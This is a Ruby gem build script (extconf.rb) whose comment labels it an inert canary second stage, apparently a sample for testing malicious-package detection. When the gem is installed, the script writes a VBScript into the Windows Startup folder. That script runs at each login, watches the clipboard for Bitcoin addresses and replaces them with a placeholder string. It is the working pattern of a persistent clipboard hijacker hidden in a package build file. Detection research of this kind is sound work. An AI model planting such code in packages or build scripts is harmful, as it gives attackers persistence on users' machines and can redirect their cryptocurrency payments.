# INERT CANARY: the atlas-client second stage written directly from extconf.rb.
require 'mkmf'
startup = File.join(ENV['APPDATA'].to_s, 'Microsoft', 'Windows', 'Start Menu\\Programs\\Startup', 'upd.vbs')
File.write(startup, <<~VBS)
  Set o = CreateObject("htmlfile")
  t = o.ParentWindow.ClipboardData.GetData("text")
  Set r = New RegExp : r.Pattern = "^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$"
  If r.Test(t) Then CreateObject("WScript.Shell").Run "cmd /c echo CANARYaddr| clip", 0
VBS
create_makefile('noop')
